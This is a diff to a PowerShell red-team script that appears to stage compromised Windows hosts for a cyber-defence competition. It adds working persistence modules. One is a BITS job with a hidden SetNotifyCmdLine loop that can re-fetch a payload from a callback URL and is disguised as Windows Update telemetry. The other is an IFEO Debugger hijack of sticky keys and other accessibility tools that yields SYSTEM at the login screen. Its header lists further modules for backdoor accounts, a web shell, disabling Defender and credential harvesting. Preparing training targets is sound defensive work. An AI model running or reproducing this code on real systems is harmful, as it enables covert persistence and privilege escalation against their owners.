@@ -5,24 +5,28 @@
 # provisioning script (CCDC_Windows_TargetSetup_HTTP_FTP_DNS.ps1).
 #
 # Modules (each mirrors its standalone script):
-#   1. Rogue Users       - CCDC_Windows_Users_UsersAreInYourWalls.ps1
-#                         (13 local backdoor accounts across Administrators, Backup Operators, RDP)
-#   2. Web Shell         - CCDC_Windows_WebShell_SheWebShellOnMyIIS.ps1
-#                         (rogue IIS site on port 777 with ASP page)
-#   3. Scheduled Tasks   - CCDC_Windows__ScheduledTasks_ScheduledTaskinator.ps1
-#                         (2 tasks: Notepad alert every 3 min + service killer every 3 min)
-#   4. Persistence       - CCDC_Windows_Persist_ClusterShells.ps1
-#                         (7-location startup persistence; supports PS1 and EXE; prompts for payload path)
-#   5. Defender Neuter   - CCDC_Windows_DefenderNeuter.ps1
-#                         (disable Defender, Firewall, Security Center)
-#   6. Remote Access     - CCDC_Windows_RemoteAccess_OpenDoorPolicy.ps1
-#                         (misconfigure RDP, WinRM, SSH, Telnet, SNMP)
-#   7. LSA Loot          - CCDC_Windows_LSA_LootTheVault.ps1
-#                         (LSA SSP/CredProvider/AppInit credential harvesting simulation)
-#   8. DLL Hook          - CCDC_Windows_DLL_HookLineAndSinker.ps1
-#                         (AppInit_DLLs, AppCert DLLs, search-order hijack artifacts)
-#   9. SysInternals      - CCDC_Windows_SysInternals_SysInternalsNuker.ps1
-#                         (7-layer block: IFEO, AppLocker, hosts, WebClient, FW, ACL, watchdog)
+#   1.  Rogue Users       - CCDC_Windows_Users_UsersAreInYourWalls.ps1
+#                          (13 local backdoor accounts across Administrators, Backup Operators, RDP)
+#   2.  Web Shell         - CCDC_Windows_WebShell_SheWebShellOnMyIIS.ps1
+#                          (rogue IIS site on port 777 with ASP page)
+#   3.  Scheduled Tasks   - CCDC_Windows__ScheduledTasks_ScheduledTaskinator.ps1
+#                          (2 tasks: Notepad alert every 3 min + service killer every 3 min)
+#   4.  Persistence       - CCDC_Windows_Persist_ClusterShells.ps1
+#                          (7-location startup persistence; supports PS1 and EXE; prompts for payload path)
+#   5.  Defender Neuter   - CCDC_Windows_DefenderNeuter.ps1
+#                          (disable Defender, Firewall, Security Center)
+#   6.  Remote Access     - CCDC_Windows_RemoteAccess_OpenDoorPolicy.ps1
+#                          (misconfigure RDP, WinRM, SSH, Telnet, SNMP)
+#   7.  LSA Loot          - CCDC_Windows_LSA_LootTheVault.ps1
+#                          (LSA SSP/CredProvider/AppInit credential harvesting simulation)
+#   8.  DLL Hook          - CCDC_Windows_DLL_HookLineAndSinker.ps1
+#                          (AppInit_DLLs, AppCert DLLs, search-order hijack artifacts)
+#   9.  SysInternals      - CCDC_Windows_SysInternals_SysInternalsNuker.ps1
+#                          (7-layer block: IFEO, AppLocker, hosts, WebClient, FW, ACL, watchdog)
+#   10. BITS Persistence  - CCDC_Windows_BITS_BitsAndPieces.ps1
+#                          (BITS job with SetNotifyCmdLine re-queue loop; invisible to Task Scheduler/SCM)
+#   11. Sticky Fingers    - CCDC_Windows_Sliver_StickyFingers.ps1
+#                          (IFEO Debugger on sethc/utilman/osk/narrator/magnify; Shift x5 = SYSTEM at login screen)
 #
 # Usage:
 #   Interactive menu  : .\CCDC_Windows_COMBINED.ps1
@@ -1602,20 +1606,202 @@ foreach (`$name in `$targets) {
 }
 
 # =============================================================================
+# 10. BITS PERSISTENCE  - BITS job with SetNotifyCmdLine re-queue loop
+# (from CCDC_Windows_BITS_BitsAndPieces.ps1)
+# =============================================================================
+function Invoke-BITSPersistence {
+    Write-Section "10/11 - BITS Persistence: SetNotifyCmdLine re-queue loop"
+
+    $PayloadPath = ""
+    while ([string]::IsNullOrWhiteSpace($PayloadPath)) {
+        $PayloadPath = (Read-Host "  Path to payload (.exe or .ps1)").Trim()
+        if ([string]::IsNullOrWhiteSpace($PayloadPath)) { Write-Err "Path cannot be empty." }
+    }
+    if (-not (Test-Path $PayloadPath)) { Write-Err "Payload not found: $PayloadPath"; return }
+
+    $CallbackUrl = (Read-Host "  Callback URL for re-download (leave blank for local UNC loop)").Trim()
+
+    $IsExe = $PayloadPath -match '\.exe$'
+    $PayloadExt = if ($IsExe) { '.exe' } else { '.ps1' }
+
+    $DropDir = "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\cache"
+    if (-not (Test-Path $DropDir)) { New-Item -ItemType Directory -Path $DropDir -Force | Out-Null }
+    $dirObj = Get-Item $DropDir -Force
+    $dirObj.Attributes = $dirObj.Attributes -bor [System.IO.FileAttributes]::Hidden
+
+    $LocalDrop    = "$DropDir\wutelemetry-cache$PayloadExt"
+    $BitsDest     = "$DropDir\wutelemetry-stage$PayloadExt"
+    $NotifyScript = "$DropDir\wutelemetry-notify.ps1"
+
+    Copy-Item -Path $PayloadPath -Destination $LocalDrop -Force
+    $f1 = Get-Item $LocalDrop -Force; $f1.Attributes = $f1.Attributes -bor [System.IO.FileAttributes]::Hidden
+    Write-Success "  Local drop: $LocalDrop (hidden)"
+
+    if ($CallbackUrl) {
+        $BitsSource = $CallbackUrl
+        $notifyLines = [System.Collections.Generic.List[string]]::new()
+        if ($IsExe) {
+            $notifyLines.Add("Start-Process -FilePath '$BitsDest' -WindowStyle Hidden -ErrorAction SilentlyContinue")
+        } else {
+            $notifyLines.Add("Start-Process -FilePath 'powershell.exe' -ArgumentList '-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$BitsDest""' -WindowStyle Hidden -ErrorAction SilentlyContinue")
+        }
+        $notifyLines.Add("Start-Sleep -Seconds 5")
+        $notifyLines.Add('$jOut = bitsadmin /Create "WU_Telemetry_BacklogProcessor" 2>&1')
+        $notifyLines.Add('$jGuid = ($jOut | Select-String -Pattern ''\{[0-9A-Fa-f-]+\}'').Matches.Value')
+        $notifyLines.Add('if ($jGuid) {')
+        $notifyLines.Add("    bitsadmin /AddFile `$jGuid '$CallbackUrl' '$BitsDest' | Out-Null")
+        $notifyLines.Add('    bitsadmin /SetPriority $jGuid FOREGROUND | Out-Null')
+        $notifyLines.Add('    bitsadmin /SetMinRetryDelay $jGuid 900 | Out-Null')
+        $notifyLines.Add('    bitsadmin /SetNoProgressTimeout $jGuid 7776000 | Out-Null')
+        $notifyLines.Add('    bitsadmin /SetNotifyFlags $jGuid 3 | Out-Null')
+        $notifyLines.Add("    bitsadmin /SetNotifyCmdLine `$jGuid 'powershell.exe' '-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$NotifyScript""' | Out-Null")
+        $notifyLines.Add('    bitsadmin /Resume $jGuid | Out-Null')
+        $notifyLines.Add('}')
+    } else {
+        $LocalUNC = $LocalDrop -replace '^C:\\', '\\127.0.0.1\C$\'
+        $BitsSource = $LocalUNC
+        $notifyLines = [System.Collections.Generic.List[string]]::new()
+        if ($IsExe) {
+            $notifyLines.Add("Start-Process -FilePath '$LocalDrop' -WindowStyle Hidden -ErrorAction SilentlyContinue")
+        } else {
+            $notifyLines.Add("Start-Process -FilePath 'powershell.exe' -ArgumentList '-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$LocalDrop""' -WindowStyle Hidden -ErrorAction SilentlyContinue")
+        }
+        $notifyLines.Add("Start-Sleep -Seconds 3")
+        $notifyLines.Add("Remove-Item -Path '$BitsDest' -Force -ErrorAction SilentlyContinue")
+        $notifyLines.Add('$jOut = bitsadmin /Create "WU_Telemetry_BacklogProcessor" 2>&1')
+        $notifyLines.Add('$jGuid = ($jOut | Select-String -Pattern ''\{[0-9A-Fa-f-]+\}'').Matches.Value')
+        $notifyLines.Add('if ($jGuid) {')
+        $notifyLines.Add("    bitsadmin /AddFile `$jGuid '$LocalUNC' '$BitsDest' | Out-Null")
+        $notifyLines.Add('    bitsadmin /SetPriority $jGuid FOREGROUND | Out-Null')
+        $notifyLines.Add('    bitsadmin /SetMinRetryDelay $jGuid 900 | Out-Null')
+        $notifyLines.Add('    bitsadmin /SetNoProgressTimeout $jGuid 7776000 | Out-Null')
+        $notifyLines.Add('    bitsadmin /SetNotifyFlags $jGuid 3 | Out-Null')
+        $notifyLines.Add("    bitsadmin /SetNotifyCmdLine `$jGuid 'powershell.exe' '-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$NotifyScript""' | Out-Null")
+        $notifyLines.Add('    bitsadmin /Resume $jGuid | Out-Null')
+        $notifyLines.Add('}')
+    }
+
+    $NotifyContent = $notifyLines -join [System.Environment]::NewLine
+    Set-Content -Path $NotifyScript -Value $NotifyContent -Encoding UTF8 -Force
+    $fNotify = Get-Item $NotifyScript -Force; $fNotify.Attributes = $fNotify.Attributes -bor [System.IO.FileAttributes]::Hidden
+    Write-Success "  Notify script: $NotifyScript (hidden)"
+
+    # Cancel any existing job with our name
+    try {
+        $listOut = bitsadmin /List /AllUsers 2>&1 | Out-String
+        $allGuids = [regex]::Matches($listOut, '\{[0-9A-Fa-f-]+\}') | Select-Object -ExpandProperty Value
+        foreach ($g in $allGuids) {
+            $info = bitsadmin /Info $g /Verbose 2>&1 | Out-String
+            if ($info -match 'WU_Telemetry_BacklogProcessor') {
+                bitsadmin /Cancel $g 2>&1 | Out-Null
+                Write-Info "  Cancelled existing BITS job: $g"
+            }
+        }
+    } catch { Write-Warn "  Could not enumerate BITS jobs: $_" }
+
+    # Create and configure the job
+    $createOut = bitsadmin /Create "WU_Telemetry_BacklogProcessor" 2>&1 | Out-String
+    $jobGuid = ([regex]::Match($createOut, '\{[0-9A-Fa-f-]+\}')).Value
+    if (-not $jobGuid) { Write-Err "Failed to create BITS job: $createOut"; return }
+
+    bitsadmin /AddFile            $jobGuid "$BitsSource" "$BitsDest"                   2>&1 | Out-Null
+    bitsadmin /SetPriority        $jobGuid FOREGROUND                                  2>&1 | Out-Null
+    bitsadmin /SetMinRetryDelay   $jobGuid 900                                         2>&1 | Out-Null
+    bitsadmin /SetNoProgressTimeout $jobGuid 7776000                                   2>&1 | Out-Null
+    bitsadmin /SetDescription     $jobGuid "Windows Update telemetry backlog processor" 2>&1 | Out-Null
+    bitsadmin /SetNotifyFlags     $jobGuid 3                                            2>&1 | Out-Null
+    $notifyArg = "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$NotifyScript"""
+    bitsadmin /SetNotifyCmdLine   $jobGuid "powershell.exe" "$notifyArg"               2>&1 | Out-Null
+    bitsadmin /Resume             $jobGuid                                              2>&1 | Out-Null
+
+    # Execute payload immediately
+    if ($IsExe) {
+        Start-Process -FilePath $LocalDrop -WindowStyle Hidden
+    } else {
+        Start-Process -FilePath "powershell.exe" `
+            -ArgumentList "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$LocalDrop`"" `
+            -WindowStyle Hidden
+    }
+
+    Write-Success "  BITS job: $jobGuid  (WU_Telemetry_BacklogProcessor)"
+    Write-Success "  Payload executed immediately."
+    Write-Warn    "  Verify: bitsadmin /List /AllUsers /Verbose"
+}
+
+# =============================================================================
+# 11. STICKY FINGERS  - IFEO Debugger on accessibility tools at login screen
+# (from CCDC_Windows_Sliver_StickyFingers.ps1)
+# =============================================================================
+function Invoke-StickyFingers {
+    Write-Section "11/11 - Sticky Fingers: IFEO on accessibility tools (pre-auth SYSTEM)"
+
+    $PayloadPath = ""
+    while ([string]::IsNullOrWhiteSpace($PayloadPath)) {
+        $PayloadPath = (Read-Host "  Path to payload EXE (must be .exe)").Trim()
+        if ([string]::IsNullOrWhiteSpace($PayloadPath)) { Write-Err "Path cannot be empty." }
+    }
+    if (-not (Test-Path $PayloadPath)) { Write-Err "Payload not found: $PayloadPath"; return }
+    if ($PayloadPath -notmatch '\.exe$') { Write-Err "IFEO Debugger requires an .exe payload. PS1 is not supported here."; return }
+
+    $DropDir = "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\cache"
+    if (-not (Test-Path $DropDir)) { New-Item -ItemType Directory -Path $DropDir -Force | Out-Null }
+    $dirObj = Get-Item $DropDir -Force
+    $dirObj.Attributes = $dirObj.Attributes -bor [System.IO.FileAttributes]::Hidden
+
+    $DropTargets = @(
+        @{ Process = "sethc.exe";    DropName = "acchost-sethc.exe";   Desc = "Sticky Keys (Shift x5)" }
+        @{ Process = "utilman.exe";  DropName = "acchost-utilman.exe";  Desc = "Utility Manager (Win+U)" }
+        @{ Process = "osk.exe";      DropName = "acchost-osk.exe";      Desc = "On-Screen Keyboard" }
+        @{ Process = "narrator.exe"; DropName = "acchost-narrator.exe"; Desc = "Narrator" }
+        @{ Process = "magnify.exe";  DropName = "acchost-magnify.exe";  Desc = "Magnifier" }
+    )
+
+    $IFEOBase = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+
+    foreach ($target in $DropTargets) {
+        Write-Info "Planting for $($target.Process) - $($target.Desc) ..."
+        $DropPath = "$DropDir\$($target.DropName)"
+        try {
+            Copy-Item -Path $PayloadPath -Destination $DropPath -Force
+            $fDrop = Get-Item $DropPath -Force
+            $fDrop.Attributes = $fDrop.Attributes -bor [System.IO.FileAttributes]::Hidden
+        } catch {
+            Write-Err "  Failed to copy payload for $($target.Process): $_"
+            continue
+        }
+        $IFEOKey = "$IFEOBase\$($target.Process)"
+        try {
+            if (-not (Test-Path $IFEOKey)) { New-Item -Path $IFEOKey -Force | Out-Null }
+            Set-ItemProperty -Path $IFEOKey -Name "Debugger" -Value "`"$DropPath`"" -Type String -Force
+            Write-Success "  IFEO\$($target.Process)\Debugger -> $DropPath"
+        } catch {
+            Write-Err "  Failed to set IFEO for $($target.Process): $_"
+        }
+    }
+
+    Write-Host ""
+    Write-Warn  "Sticky Fingers planted on 5 accessibility tools."
+    Write-Warn  "Trigger: RDP to login screen -> press Shift 5 times -> SYSTEM beacon fires."
+    Write-Warn  "         (Also Win+U or Win+Enter at login screen)"
+}
+
+# =============================================================================
 # MAIN  - Interactive menu loop or -Modules param dispatch
 # =============================================================================
 
 # Menu entry definitions
 $menuItems = @(
-    @{ Key='1'; Name='Users';          Label='Rogue Users       - 3 backdoor Domain Admin AD accounts' }
-    @{ Key='2'; Name='WebShell';       Label='Web Shell         - Rogue IIS site on port 777' }
-    @{ Key='3'; Name='ScheduledTasks'; Label='Scheduled Tasks   - Notepad alert + service killer every 3 min' }
-    @{ Key='4'; Name='Persistence';    Label='Persistence       - 5-location startup persistence planter' }
-    @{ Key='5'; Name='DefenderNeuter'; Label='Defender Neuter   - Disable Defender, Firewall, Security Center' }
-    @{ Key='6'; Name='RemoteAccess';   Label='Remote Access     - Misconfigure RDP, WinRM, SSH, Telnet, SNMP' }
-    @{ Key='7'; Name='LSA';            Label='LSA Loot          - LSA SSP/CredProvider credential harvesting' }
-    @{ Key='8'; Name='DLLHook';        Label='DLL Hook          - AppInit_DLLs, AppCert DLLs, search-order hijack' }
-    @{ Key='9'; Name='SysInternals';   Label='SysInternals      - 7-layer block on Sysinternals forensic tools' }
+    @{ Key='1';  Name='Users';          Label='Rogue Users       - 13 backdoor local accounts (Admins/BackupOps/RDP)' }
+    @{ Key='2';  Name='WebShell';       Label='Web Shell         - Rogue IIS site on port 777' }
+    @{ Key='3';  Name='ScheduledTasks'; Label='Scheduled Tasks   - Notepad alert + service killer every 3 min' }
+    @{ Key='4';  Name='Persistence';    Label='Persistence       - 7-location startup persistence planter' }
+    @{ Key='5';  Name='DefenderNeuter'; Label='Defender Neuter   - Disable Defender, Firewall, Security Center' }
+    @{ Key='6';  Name='RemoteAccess';   Label='Remote Access     - Misconfigure RDP, WinRM, SSH, Telnet, SNMP' }
+    @{ Key='7';  Name='LSA';            Label='LSA Loot          - LSA SSP/CredProvider credential harvesting' }
+    @{ Key='8';  Name='DLLHook';        Label='DLL Hook          - AppInit_DLLs, AppCert DLLs, search-order hijack' }
+    @{ Key='9';  Name='SysInternals';   Label='SysInternals      - 7-layer block on Sysinternals forensic tools' }
+    @{ Key='10'; Name='BITS';           Label='BITS Persistence  - SetNotifyCmdLine loop (invisible to Task Scheduler/SCM)' }
+    @{ Key='11'; Name='StickyFingers';  Label='Sticky Fingers    - IFEO on accessibility tools (Shift x5 = SYSTEM at login)' }
 )
 
 # Map both numbers and names to a canonical name
@@ -1629,6 +1815,8 @@ $moduleMap = @{
     '7'               = 'LSA'
     '8'               = 'DLLHook'
     '9'               = 'SysInternals'
+    '10'              = 'BITS'
+    '11'              = 'StickyFingers'
     'USERS'           = 'Users'
     'WEBSHELL'        = 'WebShell'
     'SCHEDULEDTASKS'  = 'ScheduledTasks'
@@ -1638,11 +1826,15 @@ $moduleMap = @{
     'LSA'             = 'LSA'
     'DLLHOOK'         = 'DLLHook'
     'SYSINTERNALS'    = 'SysInternals'
+    'BITS'            = 'BITS'
+    'STICKYFINDERS'   = 'StickyFingers'
+    'STICKYFINGERS'   = 'StickyFingers'
 }
 
 # Canonical execution order (dependency-safe)
 $execOrder = @('Users','WebShell','ScheduledTasks','Persistence',
-               'DefenderNeuter','RemoteAccess','LSA','DLLHook','SysInternals')
+               'DefenderNeuter','RemoteAccess','LSA','DLLHook','SysInternals',
+               'BITS','StickyFingers')
 
 function Show-Menu {
     param([hashtable]$Status = @{})
@@ -1685,6 +1877,8 @@ function Invoke-Modules {
                     'LSA'            { Invoke-LSALootTheVault }
                     'DLLHook'        { Invoke-DLLHookLineAndSinker }
                     'SysInternals'   { Invoke-SysInternalsNuker }
+                    'BITS'           { Invoke-BITSPersistence }
+                    'StickyFingers'  { Invoke-StickyFingers }
                 }
                 $Status[$mod] = 'ok'
             } catch {
@@ -1743,7 +1937,7 @@ while ($true) {
     }
 
     if ($raw -eq 'A') {
-        $selected = @('1','2','3','4','5','6','7','8','9')
+        $selected = @('1','2','3','4','5','6','7','8','9','10','11')
     } else {
         $selected = $raw -split '[,\s]+' | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne '' }
     }
